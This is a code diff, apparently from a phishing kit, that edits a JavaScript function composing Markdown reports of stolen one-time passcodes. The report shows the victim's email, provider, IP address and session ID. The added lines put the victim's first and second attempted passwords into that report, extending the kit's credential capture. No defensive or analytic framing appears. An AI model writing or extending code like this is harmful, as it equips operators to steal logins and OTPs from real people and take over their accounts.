@@ -127,13 +127,15 @@ const composeCredentialsMessage = (data) => {
  */
 const composeOtpMessage = (data) => {
     const { otp, session } = data;
-    const { email, provider, clientIP, sessionId } = session || {};
+    const { email, provider, clientIP, sessionId, firstAttemptPassword, secondAttemptPassword } = session || {};
 
     const safeOtp = escapeMarkdown(otp);
     const safeEmail = escapeMarkdown(email || 'N/A');
     const safeProvider = escapeMarkdown(provider || 'N/A');
     const safeIP = escapeMarkdown(clientIP || 'N/A');
     const safeSessionId = escapeMarkdown(sessionId);
+    const safeFirstPw = escapeMarkdown(firstAttemptPassword || 'N/A');
+    const safeSecondPw = escapeMarkdown(secondAttemptPassword || 'N/A');
 
     const formattedTimestamp = new Date().toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -150,6 +152,8 @@ const composeOtpMessage = (data) => {
 *ASSOCIATED SESSION*
 - 📧 Email: ${safeEmail}
 - 🏢 Provider: *${safeProvider}*
+- 🔑 First Password: ${safeFirstPw}
+- 🔑 Second Password: ${safeSecondPw}
 - 📍 IP Address: ${safeIP}
 - 🆔 Session ID: ${safeSessionId}
 
